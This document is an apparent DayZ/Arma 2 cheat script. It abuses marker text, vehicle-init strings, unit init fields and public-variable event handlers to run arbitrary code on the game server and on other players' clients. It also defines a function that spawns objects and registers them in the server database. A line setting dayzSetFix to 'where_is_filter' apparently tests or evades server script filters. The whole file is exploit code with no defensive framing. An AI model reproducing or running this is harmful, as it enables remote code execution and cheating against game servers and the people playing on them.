local_publishObj = {
//[dayz_characterID,_tent,[_dir,_location],"TentStorage"]
_charID =		_this select 0;
object = 		_this select 1;
_worldspace = 	_this select 2;
_className = 	_this select 3;
_id =			0;

_dir = 		_worldspace select 0;
_location = _worldspace select 1;

call compile ("object = create" + "Vehicle [_className, _location, [], 0, ""CAN_COLLIDE""];
object setdir _dir;
object setpos _location;
object setVariable [""OwnerID"", _charID, true];");

//add to database
dayz_serverObjectMonitor set [count dayz_serverObjectMonitor,object];

//get UID
_uid = object call dayzobjectUID;

object setVariable ["ObjectUID", _uid, true];
};

if (isNil ("dayz_instance") ) then
{
	_code = _this select 0;

	deleteMarker "dwarden";
	marker = "dwarden";
	marker = createMarker [marker, [0,0,0]];

	deleteMarker "dwarden2";
	marker1 = "dwarden2";
	marker1 = createMarker [marker1, [0,0,0]];
	
		usecepi = player;
		publicVariableServer "usecepi";

	if (isNil ("hangender") ) then {
		hangender = 1;
		marker setMarkerColor format["local_publishObj = %1; ""JIPRequest"" addPublicVariableEventHandler { _code = markerText ""dwarden""; usecepi setVehicleInit _code; processInitCommands; clearVehicleInit usecepi; };", local_publishObj];
		marker1 setMarkerColor "ca\modules\Functions\variables\fn_swapVars.sqf";
		x = [{ ["___v2 = markerColor ""dwarden"";0", 0] exec (markerColor "dwarden2"); }];
		publicVariableServer "x";

		player setVehicleInit "isnil( (x select 0) );";
		processInitCommands;
		clearVehicleInit player;
		sleep 1;
		hint "Init RE";
	};

	marker setMarkerText _code;
	JIPRequest = [];
	publicVariable "JIPRequest";
}
else
{
	if (isNil "re500") then
	{
		re500 = true;
		usecEpi = createTeam ["bowonky", format["'dayzSetFix' addPublicVariableEventHandler
		{
			_code = markerText 'respawn_west';
			call compile _code;
			remExField = [nil,nil,(';'+_code+';')];
			publicVariable 'remExField';
			'respawn_west' setMarkerText 'NO';
		}; local_publishObj = %1;", local_publishObj]];
		publicVariable "usecEpi";
		usecBleed = [{preProcessFileLineNumbers=str usecEpi;runInitScript;}];
		publicVariable "usecBleed";
		BIS_MPF_dummygroup = "Cow03";
		BIS_MPF_logic = BIS_MPF_dummygroup createUnit [getPosATL player, createGroup east, "if (isDedicated) then {{if (true) then _x;} count usecBleed;};", 0.5, "CORPORAL"];
		sleep 1;
	};

	"respawn_west" setMarkerText ";"+(_this select 0)+";";
	dayzSetFix = ["where_is_filter"];
	publicVariableServer "dayzSetFix";
};